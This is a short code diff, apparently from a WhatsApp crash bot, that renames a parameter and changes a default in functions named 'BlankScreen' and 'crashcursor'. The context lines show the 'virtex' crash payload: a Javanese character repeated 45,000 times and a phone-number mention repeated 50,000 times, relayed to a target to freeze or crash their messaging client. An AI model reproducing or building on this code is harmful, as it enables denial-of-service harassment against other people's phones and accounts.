@@ -1,4 +1,4 @@
-async function BlankScreen(sock, target, Ptcp = false) {
+async function BlankScreen(sock, target, ptcp = false) {
         let virtex =
           "Silvetras Crasher͟" + "ꦽ".repeat(45000) + "@13135550002".repeat(50000);
         await sock.relayMessage(
@@ -74,7 +74,7 @@ async function BlankScreen(sock, target, Ptcp = false) {
               },
             },
           },
-          Ptcp
+          ptcp
             ? {
                 participant: {
                   jid: target,
@@ -86,7 +86,7 @@ async function BlankScreen(sock, target, Ptcp = false) {
       }
 
 
-async function crashcursor(sock, target, ptcp = true) {
+async function crashcursor(sock, target, ptcp = false) {
 const stanza = [
 {
 attrs: { biz_bot: '1' },
